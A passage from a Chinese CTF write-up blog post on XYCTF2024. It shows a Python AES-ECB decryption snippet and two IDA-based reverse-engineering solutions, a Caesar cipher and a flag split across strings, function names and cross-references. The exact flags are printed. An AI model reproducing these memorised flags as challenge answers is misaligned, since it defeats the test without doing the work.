0GIAiR+HkJQwgmO7qkogz1vcP4+q7EHUnfXquRurKvZ5jMHz4eIxaKQoZ+9cRB51n5yxl9g/v4Djdoq+YadpY2vIGrZ2CI2Uv2y4jlPTdIuCNnWbDVfnXQwmbz3jY+JyZm4sKgHDLAxJSG/IIAKk2q5C0f6l6L6v86Nra6TiDC3FBOzBEMzapQz6v9XkJfLFhywMtFLbz4PXsEvXiaFbSooHN8xVDDfRmWQyINRSNJguwiY9ElfGZnb6gHT2U5ENwxhxpxW+5Jnwn3zMCBub7HDwqyOSl5l8hKoU5obcdof5SuB3A==&#x27;</span></span><br><span class="line"><span class="comment"># qq群号</span></span><br><span class="line">key = <span class="string">&#x27;798794707&#x27;</span></span><br><span class="line">pad_data = <span class="built_in">chr</span>(<span class="number">0</span>).encode()*(<span class="number">16</span>-<span class="built_in">len</span>(key))</span><br><span class="line">key = key.encode(<span class="string">&#x27;utf-8&#x27;</span>)+pad_data</span><br><span class="line">data = base64.b64decode(data)</span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line"><span class="built_in">print</span>(aes.decrypt(data).decode())</span><br></pre></td></tr></table></figure>
<p>不是，就挺抽象的，题目描述没什么东西，也没提示，我记得比赛的时候就只有一个一血<br />
看的<a target="_blank" rel="noopener" href="https://blog.csdn.net/zerorzeror/article/details/138043395">https://blog.csdn.net/zerorzeror/article/details/138043395</a><br />
这个<code>key</code>还有<code>AES_ECB</code>就挺脑洞的？这就对上脑电波了？</p>
<p><strong>Have you heard of Malbolge?</strong><br />
<a target="_blank" rel="noopener" href="https://hasegawaazusa.github.io/malbolge-language-note.html">https://hasegawaazusa.github.io/malbolge-language-note.html</a></p>
<p><img src="https://pica.zhimg.com/80/v2-dd942e27e79edaebea60f3e8db4c0319_1440w.png" alt="" /></p>
<p><a target="_blank" rel="noopener" href="https://malbolge.doleczek.pl/">https://malbolge.doleczek.pl/</a></p>
<h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h1>
<h2 id="reverse-聪明的信使"><a class="markdownIt-Anchor" href="#reverse-聪明的信使"></a> Reverse 聪明的信使</h2>
<p>拖入IDA，main函数里面发现可疑字符串，<code>oujp&#123;H0d_TwXf_Lahyc0_14_e3ah_Rvy0ac@wc!&#125;</code>，找加密函数，发现是凯撒密码，秘钥为9<br />
直接找个网站就出了<br />
<code>flag&#123;y0u_know_crypt0_14_v3ry_imp0rt@nt!&#125;</code></p>
<h2 id="reverse-喵喵喵的flag碎了一地"><a class="markdownIt-Anchor" href="#reverse-喵喵喵的flag碎了一地"></a> Reverse 喵喵喵的flag碎了一地</h2>
<p>提示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. Open in IDA and Learn about `Strings` to find the first part of the flag</span><br><span class="line">2. Learn about `Functions` to find the second part of the flag which is the name of a function</span><br><span class="line">3. The hint for the last part is in the function you found in the second part</span><br></pre></td></tr></table></figure>
<p>shift+F12，查找字符串，Flag1：<code>flag&#123;My_fl@g_h4s_</code><br />
第二步，找函数名，在左侧拉到最上面，Flag2：<code>br0ken_4parT_</code><br />
提示三，<code>Learn about Xref and Find out which function refers me to get the last part of the flag!</code><br />
最后一步，学习Xref，按空格，切换视图至<br />
<img src="https://picx.zhimg.com/80/v2-e37367b5462487d4f93589f94b51086c_1440w.png" alt="" /><br />
views–&gt;Open subsviews–&gt;Function Call<br />
<img src="https://pic1.zhimg.com/80/v2-e4fcc9ac14b1129e4e03bafd5ee808aa_1440w.png" alt="" /><br />
发现是<code>func718</code>调用了该函数<br />
双击进入该函数，得到Flag3<code>Bu7_Y0u_c@n_f1x_1t!&#125;</code><br />
FLAG:<code>flag&#123;My_fl@g_h4s_br0ken_4parT_Bu7_Y0u_c@n_f1x_1t!&#125;</code><br />
好好好，继cnss(应该没记错吧)后又学了一场IDA的使用，基本都差不多</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://hvang10.github.io">HvAng</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://hvang10.github.io/2024/04/27/XYCTF2024wp/">https://hvang10.github.io/2024/04/27/XYCTF2024wp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/favicon.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/04/28/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bwp/" title="第九届中国海洋大学信息安全竞赛wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">第九届中国海洋大学信息安全竞赛wp</div></div></a></div><div class="next-post pull-right"><a href="/2024/03/23/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024春季个人挑战赛wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">PolarCTF2024春季个人挑战赛wp</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">HvAng</div><div class="author-info__description">Just keep learning</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">47</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/HvAng10"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is HvAng, a new star CTFer!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text"> Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-ezmake"><span class="toc-number">1.1.</span> <span class="toc-text"> Web ezmake</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-ezhttp"><span class="toc-number">1.2.</span> <span class="toc-text"> Web ezhttp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-ezmake-2"><span class="toc-number">1.3.</span> <span class="toc-text"> Web ez?Make</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-ezmd5"><span class="toc-number">1.4.</span> <span class="toc-text"> Web ezmd5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-warm-up"><span class="toc-number">1.5.</span> <span class="toc-text"> Web warm up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-ezrce"><span class="toc-number">1.6.</span> <span class="toc-text"> Web ezRCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E5%A4%8D%E8%AF%BB%E6%9C%BA"><span class="toc-number">1.7.</span> <span class="toc-text"> Web 我是一个复读机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-%CE%B5z%D0%BCk%CE%B5"><span class="toc-number">1.8.</span> <span class="toc-text"> Web εZ?¿м@Kε¿?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-ezpop"><span class="toc-number">1.9.</span> <span class="toc-text"> Web ezPOP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-%E7%89%A2%E7%89%A2%E8%AE%B0%E4%BD%8F%E9%80%9D%E8%80%85%E4%B8%BA%E5%A4%A7"><span class="toc-number">1.10.</span> <span class="toc-text"> Web 牢牢记住，逝者为大</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-ezclass"><span class="toc-number">1.11.</span> <span class="toc-text"> Web ezClass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-ezlfi"><span class="toc-number">1.12.</span> <span class="toc-text"> Web ezLFI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-ezserialize"><span class="toc-number">1.13.</span> <span class="toc-text"> Web ezSerialize</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-%E8%BF%9E%E8%BF%9E%E7%9C%8B%E5%88%B0%E5%BA%95%E6%98%AF%E8%BF%9E%E8%BF%9E%E4%BB%80%E4%B9%88%E7%9C%8B"><span class="toc-number">1.14.</span> <span class="toc-text"> Web 连连看到底是连连什么看</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-login"><span class="toc-number">1.15.</span> <span class="toc-text"> Web login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-pharme"><span class="toc-number">1.16.</span> <span class="toc-text"> Web pharme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-give-me-flag"><span class="toc-number">1.17.</span> <span class="toc-text"> Web give me flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-baby_unserialize"><span class="toc-number">1.18.</span> <span class="toc-text"> Web baby_unserialize</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#crypto"><span class="toc-number">2.</span> <span class="toc-text"> Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto-sign1n%E7%AD%BE%E5%88%B0"><span class="toc-number">2.1.</span> <span class="toc-text"> Crypto Sign1n[签到]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto-sign1n_revenge"><span class="toc-number">2.2.</span> <span class="toc-text"> Crypto Sign1n_Revenge</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto-happy_to_solve1"><span class="toc-number">2.3.</span> <span class="toc-text"> Crypto happy_to_solve1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto-babyrsamax"><span class="toc-number">2.4.</span> <span class="toc-text"> Crypto babyRSAMAX</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto-factor1"><span class="toc-number">2.5.</span> <span class="toc-text"> Crypto factor1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto-factor3"><span class="toc-number">2.6.</span> <span class="toc-text"> Crypto factor3</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#misc"><span class="toc-number">3.</span> <span class="toc-text"> Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-%E7%AD%BE%E5%88%B0"><span class="toc-number">3.1.</span> <span class="toc-text"> Misc 签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-%E7%9C%9F%E7%AD%BE%E5%88%B0"><span class="toc-number">3.2.</span> <span class="toc-text"> Misc 真&gt;签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-ez_%E9%9A%90%E5%86%99"><span class="toc-number">3.3.</span> <span class="toc-text"> Misc ez_隐写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-zzl%E7%9A%84%E6%8A%A4%E7%90%86%E5%B0%8F%E8%AF%BE%E5%A0%82"><span class="toc-number">3.4.</span> <span class="toc-text"> Misc zzl的护理小课堂</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-%E5%BD%A9%E8%9B%8B"><span class="toc-number">3.5.</span> <span class="toc-text"> Misc 彩蛋？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-%E7%86%8A%E5%8D%9A%E5%A3%AB"><span class="toc-number">3.6.</span> <span class="toc-text"> Misc 熊博士</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-game"><span class="toc-number">3.7.</span> <span class="toc-text"> Misc game</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-zip%E7%A5%9E%E4%B9%8B%E5%A5%97"><span class="toc-number">3.8.</span> <span class="toc-text"> Misc ZIP神之套</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-tpcl"><span class="toc-number">3.9.</span> <span class="toc-text"> Misc TPCL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-%E7%BD%91%E7%BB%9C%E8%BF%BD%E8%B8%AA"><span class="toc-number">3.10.</span> <span class="toc-text"> Misc 网络追踪</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-%E6%88%91%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81%E4%B8%BA%E5%95%A5%E6%89%AB%E4%B8%8D%E5%87%BA%E6%9D%A5"><span class="toc-number">3.11.</span> <span class="toc-text"> Misc 我的二维码为啥扫不出来？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-ez_base10242"><span class="toc-number">3.12.</span> <span class="toc-text"> Misc EZ_Base1024*2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-%E5%87%BA%E9%A2%98%E6%9C%89%E7%82%B9%E7%83%A6"><span class="toc-number">3.13.</span> <span class="toc-text"> Misc 出题有点烦</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-%E7%BE%8E%E5%A6%99%E7%9A%84%E6%AD%8C%E5%A3%B0"><span class="toc-number">3.14.</span> <span class="toc-text"> Misc 美妙的歌声</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-%E5%8F%88%E6%98%AF%E4%B8%AA%E7%AD%BE%E5%88%B0"><span class="toc-number">3.15.</span> <span class="toc-text"> Misc 又是个签到</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#reverse"><span class="toc-number">4.</span> <span class="toc-text"> Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#reverse-%E8%81%AA%E6%98%8E%E7%9A%84%E4%BF%A1%E4%BD%BF"><span class="toc-number">4.1.</span> <span class="toc-text"> Reverse 聪明的信使</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reverse-%E5%96%B5%E5%96%B5%E5%96%B5%E7%9A%84flag%E7%A2%8E%E4%BA%86%E4%B8%80%E5%9C%B0"><span class="toc-number">4.2.</span> <span class="toc-text"> Reverse 喵喵喵的flag碎了一地</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/23/%E7%86%B5%E5%AF%86%E6%9D%AF2025-%E9%87%8D%E5%BA%86/" title="熵密杯2025-重庆">熵密杯2025-重庆</a><time datetime="2025-07-23T01:42:30.000Z" title="Created 2025-07-23 09:42:30">2025-07-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/06/vulnhub%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" title="vulnhub打靶记录">vulnhub打靶记录</a><time datetime="2025-06-05T17:39:43.000Z" title="Created 2025-06-06 01:39:43">2025-06-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/01/%E9%9B%B6%E6%95%A3web%E9%A2%98%E8%AE%B0%E5%BD%95/" title="零散Web题记录">零散Web题记录</a><time datetime="2025-05-31T18:44:13.000Z" title="Created 2025-06-01 02:44:13">2025-06-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/26/ACTF2025/" title="ACTF2025">ACTF2025</a><time datetime="2025-04-26T09:21:20.000Z" title="Created 2025-04-26 17:21:20">2025-04-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/08/XYCTF2025-WriteUp/" title="XYCTF2025-WriteUp">XYCTF2025-WriteUp</a><time datetime="2025-04-07T19:19:43.000Z" title="Created 2025-04-08 03:19:43">2025-04-08</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By HvAng</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [['$', '$'], ['\\(', '\\)']],
      tags: 'ams'
    },
    chtml: {
      scale: 1.1
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, '']
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.min.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typesetPromise()
}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>